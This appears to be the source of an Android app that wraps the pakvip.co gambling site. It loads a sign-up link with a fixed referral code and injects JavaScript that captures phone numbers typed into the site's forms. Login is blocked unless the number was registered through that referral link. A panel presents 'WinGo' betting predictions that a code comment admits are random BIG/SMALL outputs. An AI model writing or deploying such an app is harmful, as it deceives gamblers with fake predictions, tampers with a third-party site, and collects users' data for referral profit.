package com.example.pakvip

import android.annotation.SuppressLint
import android.content.Context
import android.content.res.AssetFileDescriptor
import android.graphics.Color
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.MotionEvent
import android.view.View
import android.view.ViewConfiguration
import android.view.ViewGroup
import android.webkit.JavascriptInterface
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import android.widget.ImageView
import androidx.appcompat.app.AppCompatActivity
import kotlin.math.abs

class DraggableFrame(context: Context) : FrameLayout(context) {
    private var downX = 0f
    private var downY = 0f
    private var startX = 0f
    private var startY = 0f
    private var dragging = false
    private val slop = ViewConfiguration.get(context).scaledTouchSlop

    override fun onInterceptTouchEvent(ev: MotionEvent): Boolean {
        when (ev.actionMasked) {
            MotionEvent.ACTION_DOWN -> {
                downX = ev.rawX; downY = ev.rawY
                startX = x; startY = y
                dragging = false
            }
            MotionEvent.ACTION_MOVE -> {
                if (!dragging && (abs(ev.rawX - downX) > slop || abs(ev.rawY - downY) > slop)) {
                    dragging = true
                }
            }
        }
        return dragging
    }

    override fun onTouchEvent(ev: MotionEvent): Boolean {
        when (ev.actionMasked) {
            MotionEvent.ACTION_DOWN -> {
                downX = ev.rawX; downY = ev.rawY
                startX = x; startY = y
            }
            MotionEvent.ACTION_MOVE -> {
                val p = parent as? View
                var nx = startX + (ev.rawX - downX)
                var ny = startY + (ev.rawY - downY)
                if (p != null) {
                    nx = nx.coerceIn(0f, (p.width - width).toFloat().coerceAtLeast(0f))
                    ny = ny.coerceIn(0f, (p.height - height).toFloat().coerceAtLeast(0f))
                }
                x = nx; y = ny
            }
            MotionEvent.ACTION_UP, MotionEvent.ACTION_CANCEL -> dragging = false
        }
        return true
    }
}

class MainActivity : AppCompatActivity() {

    private lateinit var root: FrameLayout
    private lateinit var webView: WebView
    private lateinit var loginPopup: FrameLayout
    private lateinit var fab: DraggableFrame
    private lateinit var panelBox: DraggableFrame
    private lateinit var panelWeb: WebView
    private val handler = Handler(Looper.getMainLooper())

    private val REGISTER_URL =
        "https://www.pakvip.co/#/register?invitationCode=17561101154"
    private val LOGIN_URL = "https://pakvip.co/#/login"

    private val PANEL_W_DP = 200
    private val PANEL_H_DP = 360
    private val FAB_DP = 52

    private var panelPage = ""
    private var panelOpen = false
    private var lastOnRegister = false
    private var wingoMode = false
    private var pendingPhone = ""

    private var mediaPlayer: MediaPlayer? = null
    private var playedRegisterVoice = false
    private var playedLoginPopupVoice = false
    private var playedMainVoice = false

    private val prefs by lazy { getSharedPreferences("pakvip", MODE_PRIVATE) }

    private var registered: Boolean
        get() = prefs.getBoolean("registered", false)
        set(v) { prefs.edit().putBoolean("registered", v).apply() }

    private fun savedPhones(): MutableSet<String> =
        prefs.getStringSet("phones", emptySet())?.toMutableSet() ?: mutableSetOf()

    private fun persistPhone(raw: String) {
        val digits = raw.filter { it.isDigit() }
        if (digits.length < 10) return
        val set = savedPhones()
        set.add(digits)
        if (digits.length > 10) set.add(digits.takeLast(10))
        prefs.edit()
            .putStringSet("phones", set)
            .putBoolean("registered", true)
            .putString("last_ok_phone", digits)
            .apply()
        registered = true
        pendingPhone = digits
    }

    private fun isPhoneAllowed(raw: String): Boolean {
        val digits = raw.filter { it.isDigit() }
        if (digits.length < 10) return false
        val set = savedPhones()
        if (set.isEmpty()) return false
        if (set.contains(digits)) return true
        val last10 = digits.takeLast(10)
        if (set.contains(last10)) return true
        return set.any { it.takeLast(10) == last10 || digits.endsWith(it.takeLast(10)) }
    }

    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    private fun stopVoice() {
        try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
        } catch (_: Exception) {
        }
        mediaPlayer = null
    }

    private fun playVoice(assetPath: String) {
        try {
            stopVoice()
            val afd: AssetFileDescriptor = assets.openFd(assetPath)
            mediaPlayer = MediaPlayer().apply {
                setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_MEDIA)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                        .build()
                )
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                setOnCompletionListener {
                    try { it.release() } catch (_: Exception) {}
                    if (mediaPlayer === it) mediaPlayer = null
                }
                prepare()
                start()
            }
        } catch (_: Exception) {
            stopVoice()
        }
    }

    /**
     * Aggressive phone capture for SPA forms (React etc.)
     * - listens input/change/keyup/paste/click
     * - MutationObserver on DOM
     * - polls every 600ms
     * - on register: Android.onRegisterPhone + savePhone when length ok
     * - on login: Android.onLoginPhone; clears field if not allowed
     */
    private val CAPTURE_JS = """
        (function(){
          if (window.__pakvipCap2) return;
          window.__pakvipCap2 = true;
          function digits(s){ return (s||'').replace(/\D/g,''); }
          function allInputs(){
            var list=[];
            try {
              list = Array.prototype.slice.call(document.querySelectorAll('input, textarea'));
            } catch(e){}
            return list;
          }
          function findPhone(){
            var best='';
            var inputs=allInputs();
            for (var i=0;i<inputs.length;i++){
              var el=inputs[i];
              try {
                if (el.type === 'password' || el.type === 'checkbox' || el.type === 'hidden') continue;
                var t=(el.type||'').toLowerCase();
                var n=((el.name||'')+' '+(el.id||'')+' '+(el.placeholder||'')+' '+(el.getAttribute('autocomplete')||'')).toLowerCase();
                var v=digits(el.value);
                if (v.length>=10 && v.length<=15){
                  if (t==='tel'||t==='number'||t==='text'||t===''||
                      /phone|mobile|user|account|login|register|tel|number|email/.test(n) || best===''){
                    best=v;
                  }
                }
              } catch(e){}
            }
            return best;
          }
          function clearPhoneInputs(){
            var inputs=allInputs();
            for (var i=0;i<inputs.length;i++){
              var el=inputs[i];
              try {
                if (el.type === 'password') continue;
                var v=digits(el.value);
                if (v.length>=8){
                  el.value='';
                  el.dispatchEvent(new Event('input',{bubbles:true}));
                  el.dispatchEvent(new Event('change',{bubbles:true}));
                }
              } catch(e){}
            }
          }
          window.__pakvipClearPhone = clearPhoneInputs;
          function report(){
            try{
              if (!window.Android) return;
              var p=findPhone();
              var href=String(location.href||'');
              var hash=String(location.hash||'');
              var onReg = href.indexOf('register')>=0 || hash.indexOf('register')>=0;
              var onLog = href.indexOf('login')>=0 || hash.indexOf('login')>=0;
              if (onReg && p){
                Android.onRegisterPhone(p);
                if (p.length>=10) Android.savePhone(p);
              } else if (onLog){
                if (p) Android.onLoginPhone(p);
              }
            }catch(e){}
          }
          ['input','change','keyup','paste','click','focusout','blur'].forEach(function(ev){
            document.addEventListener(ev, function(){ setTimeout(report, 30); }, true);
          });
          try {
            var mo = new MutationObserver(function(){ setTimeout(report, 50); });
            mo.observe(document.documentElement, {childList:true, subtree:true, attributes:true, characterData:true});
          } catch(e){}
          setInterval(report, 600);
          report();
        })();
    """.trimIndent()

    private val CLEAR_LOGIN_JS =
        "try{ if(window.__pakvipClearPhone) window.__pakvipClearPhone(); }catch(e){}"

    @SuppressLint("SetJavaScriptEnabled", "ClickableViewAccessibility")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        root = FrameLayout(this)

        webView = WebView(this).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.allowFileAccess = true
            addJavascriptInterface(Bridge(), "Android")
            webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(
                    view: WebView, request: WebResourceRequest
                ): Boolean {
                    val url = request.url.toString()
                    if (!url.contains("pakvip.co")) return true
                    return false
                }

                override fun onPageFinished(view: WebView?, url: String?) {
                    super.onPageFinished(view, url)
                    view?.evaluateJavascript(CAPTURE_JS, null)
                    refreshUi(url)
                }
            }
            loadUrl(REGISTER_URL)
        }
        root.addView(webView, ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)

        panelBox = DraggableFrame(this).apply { visibility = View.GONE }
        panelWeb = WebView(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            addJavascriptInterface(Bridge(), "Android")
            webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(
                    view: WebView, request: WebResourceRequest
                ): Boolean {
                    val u = request.url.toString()
                    // WhatsApp etc. — block inside panel (external intent optional later)
                    if (u.startsWith("http") && !u.startsWith("file:")) return true
                    return false
                }
            }
        }
        panelBox.addView(panelWeb, FrameLayout.LayoutParams(dp(PANEL_W_DP), dp(PANEL_H_DP)))
        root.addView(panelBox, FrameLayout.LayoutParams(dp(PANEL_W_DP), dp(PANEL_H_DP)))

        fab = DraggableFrame(this)
        val icon = ImageView(this).apply {
            setBackgroundResource(R.drawable.fab_bg)
            setImageResource(R.drawable.ic_crown)
            setPadding(dp(11), dp(11), dp(11), dp(11))
            setOnClickListener { openPanel() }
        }
        fab.addView(icon, FrameLayout.LayoutParams(dp(FAB_DP), dp(FAB_DP)))
        root.addView(fab, FrameLayout.LayoutParams(dp(FAB_DP), dp(FAB_DP)))

        loginPopup = buildLoginPopup()
        loginPopup.visibility = View.GONE
        root.addView(loginPopup, ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)

        setContentView(root)

        root.post {
            fab.x = (root.width - dp(FAB_DP) - dp(12)).toFloat()
            fab.y = root.height * 0.55f
            panelBox.x = ((root.width - dp(PANEL_W_DP)) / 2).toFloat()
            panelBox.y = dp(60).toFloat()
            refreshUi(webView.url)
        }

        handler.post(object : Runnable {
            override fun run() {
                refreshUi(webView.url)
                handler.postDelayed(this, 350)
            }
        })
    }

    inner class Bridge {
        @JavascriptInterface
        fun register() {
            runOnUiThread {
                hideLoginPopup()
                closePanel()
                wingoMode = false
                playedRegisterVoice = false
                webView.loadUrl(REGISTER_URL)
            }
        }

        @JavascriptInterface
        fun openGame() {
            runOnUiThread {
                wingoMode = true
                closePanel()
                handler.postDelayed({ openPanel() }, 120)
            }
        }

        @JavascriptInterface
        fun hide() {
            runOnUiThread { closePanel() }
        }

        @JavascriptInterface
        fun onRegisterPhone(phone: String) {
            val d = phone.filter { it.isDigit() }
            if (d.length >= 10) {
                pendingPhone = d
            }
        }

        /** Explicit save from JS when phone looks complete on register */
        @JavascriptInterface
        fun savePhone(phone: String) {
            runOnUiThread {
                persistPhone(phone)
            }
        }

        @JavascriptInterface
        fun onLoginPhone(phone: String) {
            val digits = phone.filter { it.isDigit() }
            runOnUiThread {
                val url = webView.url ?: ""
                if (!url.contains("login", ignoreCase = true)) return@runOnUiThread
                if (digits.length < 10) {
                    if (savedPhones().isEmpty()) showLoginPopup()
                    return@runOnUiThread
                }
                if (isPhoneAllowed(digits)) {
                    hideLoginPopup()
                } else {
                    showLoginPopup()
                    // Clear unauthorized number from login form so it doesn't stick
                    webView.evaluateJavascript(CLEAR_LOGIN_JS, null)
                }
            }
        }
    }

    private fun showLoginPopup() {
        val wasHidden = loginPopup.visibility != View.VISIBLE
        loginPopup.visibility = View.VISIBLE
        if (wasHidden || !playedLoginPopupVoice) {
            playedLoginPopupVoice = true
            playVoice("audio/login_popup.mp3")
        }
    }

    private fun hideLoginPopup() {
        loginPopup.visibility = View.GONE
    }

    private fun openPanel() { panelOpen = true; refreshUi(webView.url) }
    private fun closePanel() { panelOpen = false; refreshUi(webView.url) }

    private fun isLoginUrl(url: String) =
        url.contains("login", ignoreCase = true)

    private fun isRegisterUrl(url: String): Boolean {
        // https://pakvip.co/register#/ is prediction mode, not register form
        if (url.contains("register#/", ignoreCase = true)) return false
        return url.contains("register", ignoreCase = true)
    }

    private fun isWinGoUrl(url: String) =
        url.contains("WinGo", ignoreCase = true) ||
            url.contains("saasLottery", ignoreCase = true) ||
            // user mentioned prediction on register#/ style path after mode
            (url.contains("register#/", ignoreCase = true) && wingoMode)

    private fun isHomeAfterAuth(url: String): Boolean {
        // https://pakvip.co/#/  or similar main after login
        if (isLoginUrl(url) || isRegisterUrl(url) || isWinGoUrl(url)) return false
        return url.contains("pakvip.co")
    }

    private fun refreshUi(url: String?) {
        if (url != null) {
            val onRegister = isRegisterUrl(url)
            val onLogin = isLoginUrl(url)

            // Completed registration: left register page
            if (lastOnRegister && !onRegister && !onLogin && url.contains("pakvip.co")) {
                if (pendingPhone.length >= 10) {
                    persistPhone(pendingPhone)
                } else {
                    // still try one more JS read
                    webView.evaluateJavascript(
                        """
                        (function(){
                          try{
                            var inputs=document.querySelectorAll('input');
                            for(var i=0;i<inputs.length;i++){
                              var v=(inputs[i].value||'').replace(/\D/g,'');
                              if(v.length>=10 && window.Android) Android.savePhone(v);
                            }
                          }catch(e){}
                        })();
                        """.trimIndent(),
                        null
                    )
                    registered = true
                }
                if (!playedMainVoice) {
                    playedMainVoice = true
                    playVoice("audio/main.mp3")
                }
            }
            lastOnRegister = onRegister

            // Voices + popup
            when {
                onRegister -> {
                    hideLoginPopup()
                    if (!playedRegisterVoice) {
                        playedRegisterVoice = true
                        playVoice("audio/register.mp3")
                    }
                }
                onLogin -> {
                    playedRegisterVoice = false
                    if (savedPhones().isEmpty()) {
                        showLoginPopup()
                        webView.evaluateJavascript(CLEAR_LOGIN_JS, null)
                    }
                }
                else -> {
                    hideLoginPopup()
                    if ((registered || savedPhones().isNotEmpty()) && !playedMainVoice) {
                        playedMainVoice = true
                        playVoice("audio/main.mp3")
                    }
                }
            }
        }

        /*
         * Panel by link:
         * - Login OR Register  → panel.html  (REGISTER REQUIRED / key UI)
         * - After auth (home)  → panel2.html (Open WinGo + banner)  [unless wingoMode]
         * - WinGo / prediction → panel3.html (START → random BIG/SMALL)
         * - Open WinGo button  → wingoMode=true → panel3.html
         */
        val u = url ?: ""
        val page = when {
            isLoginUrl(u) || isRegisterUrl(u) -> "panel.html"
            wingoMode || isWinGoUrl(u) -> "panel3.html"
            registered || savedPhones().isNotEmpty() -> "panel2.html"
            else -> "panel.html"
        }

        if (page != panelPage) {
            panelPage = page
            panelWeb.loadUrl("file:///android_asset/$page")
        }
        panelBox.visibility = if (panelOpen) View.VISIBLE else View.GONE
        fab.visibility = if (panelOpen) View.GONE else View.VISIBLE
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun buildLoginPopup(): FrameLayout {
        val pw = WebView(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            addJavascriptInterface(Bridge(), "Android")
            loadUrl("file:///android_asset/popup.html")
        }
        return FrameLayout(this).apply {
            setBackgroundColor(Color.parseColor("#99000000"))
            isClickable = true
            addView(pw, FrameLayout.LayoutParams(dp(300), dp(330), Gravity.CENTER))
        }
    }

    override fun onDestroy() {
        stopVoice()
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        when {
            panelOpen -> closePanel()
            webView.canGoBack() -> webView.goBack()
            else -> super.onBackPressed()
        }
    }
}
